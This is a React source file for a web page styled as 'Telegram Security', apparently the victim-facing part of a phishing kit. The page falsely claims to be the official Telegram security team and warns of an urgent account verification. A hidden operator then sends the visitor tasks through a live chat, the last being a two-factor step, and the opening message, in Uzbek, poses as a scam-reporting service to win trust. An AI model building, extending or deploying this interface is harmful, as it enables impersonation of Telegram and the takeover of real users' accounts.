import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Shield, Send, CheckCircle, Play } from "lucide-react";
import { TaskModal } from "@/components/task-modal";
import type { User, Message, Task } from "@shared/schema";
import { useSocket } from "@/hooks/use-socket";

export default function UserInterface() {
  const [location] = useLocation();
  const userId = location.split("/user/")[1];
  const [user, setUser] = useState<User | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [currentTask, setCurrentTask] = useState<Task | null>(null);
  const [isTaskModalOpen, setIsTaskModalOpen] = useState(false);
  const [hasStartedChat, setHasStartedChat] = useState(false);
  const [isSecurityComplete, setIsSecurityComplete] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  const { emit, on, off, isConnected } = useSocket();

  // Load user data and join room
  useEffect(() => {
    if (!userId) return;

    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(userData => {
        setUser(userData);
        setIsLoading(false);
      })
      .catch(error => {
        console.error("Failed to load user:", error);
        setIsLoading(false);
      });

    if (isConnected) {
      emit("join_user_room", userId);
      emit("update_user_status", { userId, status: "online" });
    }

    return () => {
      if (isConnected && userId) {
        emit("update_user_status", { userId, status: "offline" });
      }
    };
  }, [userId, isConnected, emit]);

  // Load messages when chat starts
  useEffect(() => {
    if (!userId || !hasStartedChat) return;

    fetch(`/api/users/${userId}/messages`)
      .then(res => res.json())
      .then(data => {
        setMessages(data);
      })
      .catch(error => {
        console.error("Failed to load messages:", error);
      });
  }, [userId, hasStartedChat]);

  // Socket event handlers
  useEffect(() => {
    const handleReceiveMessage = (message: Message) => {
      setMessages(prev => [...prev, message]);
    };

    const handleReceiveTask = (data: { task: Task; message: Message }) => {
      setMessages(prev => [...prev, data.message]);
      setCurrentTask(data.task);
      setIsTaskModalOpen(true);
    };

    const handleTaskResponse = (data: { taskId: number; approved: boolean; feedback?: string }) => {
      if (data.approved && currentTask?.type === "twoFactor") {
        // Final task completed - show security complete
        setIsSecurityComplete(true);
        setIsTaskModalOpen(false);
      }
    };

    const handleMessageSent = (message: Message) => {
      setMessages(prev => [...prev, message]);
    };

    on("receive_message", handleReceiveMessage);
    on("receive_task", handleReceiveTask);
    on("task_response", handleTaskResponse);
    on("message_sent", handleMessageSent);

    return () => {
      off("receive_message", handleReceiveMessage);
      off("receive_task", handleReceiveTask);
      off("task_response", handleTaskResponse);
      off("message_sent", handleMessageSent);
    };
  }, [on, off, currentTask]);

  const startChat = () => {
    setHasStartedChat(true);
    
    // Simulate admin greeting
    setTimeout(() => {
      const greetingMessage: Message = {
        id: Date.now(),
        userId: userId!,
        sender: "admin",
        content: "🛡 Siz bu sahifaga xavfsizlik bo'yicha ogohlantirish asosida taklif etildingiz.\n\nTelegram foydalanuvchilariga nisbatan quyidagi firibgarlik holatlari aniqlangan. Iltimos, siz duch kelgan holatni tanlang yoki tushuntiring:\n\n✅ \"Telegram xodimimiz sizning hisobingizda shubhali faollik aniqladi\" degan yolg'on xabarlar.\n\n✅ \"Yutib oldingiz!\" aksiyasi bahonasida telefon raqam va SMS so'rash.\n\n✅ Telegram seanslarining chalkashtirish orqali profilni egallashga urunish.\n\n✅ \"Bot administrator\" orqali sizning profilingizga kirishga urinishlar.\n\n✅ Qrim qilishga majburlovchi soxta operatorlar bilan yozishmalar.\n\n📝 Qaysi holatdan shikoyat qilmoqdasiz?",
        timestamp: new Date(),
        isTask: false,
      };
      setMessages([greetingMessage]);
    }, 1000);
  };

  const sendMessage = () => {
    if (!newMessage.trim() || !userId) return;

    emit("user_send_message", {
      userId,
      content: newMessage,
    });

    setNewMessage("");
  };

  const formatMessageTime = (timestamp: Date | null) => {
    if (!timestamp) return "";
    return new Date(timestamp).toLocaleTimeString([], { 
      hour: '2-digit', 
      minute: '2-digit' 
    });
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">Loading security interface...</p>
        </div>
      </div>
    );
  }

  if (!user) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <Card className="w-full max-w-md mx-4">
          <CardContent className="pt-6 text-center">
            <Shield className="h-16 w-16 text-red-500 mx-auto mb-4" />
            <h1 className="text-2xl font-bold text-gray-900 mb-2">User Not Found</h1>
            <p className="text-muted-foreground">
              The user ID provided is invalid or does not exist.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Security Header */}
      <div className="bg-gradient-to-r from-blue-800 via-blue-900 to-purple-900 text-white py-16 px-4 relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-r from-blue-400/20 to-purple-400/20 animate-pulse"></div>
        <div className="container mx-auto text-center relative z-10">
          <Shield className="h-16 w-16 mx-auto mb-6" />
          <h2 className="text-4xl font-bold mb-4">Telegram Security</h2>
          <p className="text-xl text-blue-100 max-w-2xl mx-auto">
            We need to verify your account to ensure maximum security
          </p>
        </div>
      </div>

      <div className="container mx-auto py-12 px-4 max-w-4xl">
        {/* Initial Security Notice */}
        {!hasStartedChat && !isSecurityComplete && (
          <Card className="bg-gradient-to-r from-blue-500 to-blue-600 text-white text-center p-8 shadow-xl">
            <CardContent className="pt-6">
              <div className="bg-white/20 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-6">
                <Shield className="h-12 w-12" />
              </div>
              <h4 className="text-2xl font-bold mb-4">Account Security Verification</h4>
              <p className="text-blue-100 mb-6 text-lg">
                Your account requires immediate security verification. 
                Our security team will guide you through the process.
              </p>
              <Button 
                onClick={startChat}
                size="lg"
                variant="secondary"
                className="bg-white text-blue-600 hover:bg-blue-50 font-semibold px-8 py-3"
              >
                <Play className="h-5 w-5 mr-2" />
                Start Verification
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Chat Interface */}
        {hasStartedChat && !isSecurityComplete && (
          <div className="mt-8">
            <Card className="shadow-xl">
              <div className="bg-primary text-primary-foreground p-4 rounded-t-lg">
                <div className="flex items-center gap-3">
                  <div className="bg-white/20 p-2 rounded-full">
                    <Shield className="h-6 w-6" />
                  </div>
                  <div className="flex-1">
                    <h5 className="font-semibold text-lg">Security Support</h5>
                    <p className="text-sm opacity-75">Official Telegram Security Team</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-400 rounded-full"></div>
                    <span className="text-sm">Online</span>
                  </div>
                </div>
              </div>
              
              <div className="h-96 flex flex-col">
                <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-gradient-to-b from-muted/20 to-background">
                  {messages.map((message) => (
                    <div
                      key={message.id}
                      className={`flex ${message.sender === "admin" ? "justify-start" : "justify-end"} animate-in slide-in-from-bottom-2 duration-300`}
                    >
                      <div
                        className={`max-w-[70%] p-3 rounded-2xl shadow-sm ${
                          message.sender === "admin"
                            ? "bg-primary text-primary-foreground rounded-bl-sm"
                            : "bg-muted text-foreground rounded-br-sm"
                        }`}
                      >
                        <p className="text-sm">{message.content}</p>
                        {message.isTask && (
                          <Badge className="ml-2 bg-yellow-500 text-black text-xs">TASK</Badge>
                        )}
                        <p className="text-xs opacity-75 mt-1">
                          {message.sender === "admin" ? "Security Team • " : ""}
                          {formatMessageTime(message.timestamp)}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
                
                <div className="p-4 border-t">
                  <div className="flex gap-2">
                    <Input
                      value={newMessage}
                      onChange={(e) => setNewMessage(e.target.value)}
                      placeholder="Type your response..."
                      onKeyPress={(e) => e.key === "Enter" && sendMessage()}
                      className="flex-1"
                    />
                    <Button onClick={sendMessage} size="sm">
                      <Send className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </div>
            </Card>
          </div>
        )}

        {/* Security Complete */}
        {isSecurityComplete && (
          <div className="text-center mt-8">
            <Card className="border-green-200 shadow-xl">
              <CardContent className="pt-8 pb-8">
                <CheckCircle className="h-20 w-20 text-green-500 mx-auto mb-6" />
                <h4 className="text-3xl font-bold text-green-700 mb-4">
                  Security Verification Complete
                </h4>
                <p className="text-muted-foreground mb-6 text-lg">
                  Your account is now fully secured and protected.
                </p>
                <Button 
                  size="lg"
                  className="bg-green-600 hover:bg-green-700 px-8 py-3"
                >
                  <Shield className="h-5 w-5 mr-2" />
                  Security Ensured
                </Button>
              </CardContent>
            </Card>
          </div>
        )}
      </div>

      {/* Task Modal */}
      <TaskModal
        isOpen={isTaskModalOpen}
        onClose={() => setIsTaskModalOpen(false)}
        task={currentTask}
        userId={userId || ""}
      />
    </div>
  );
}
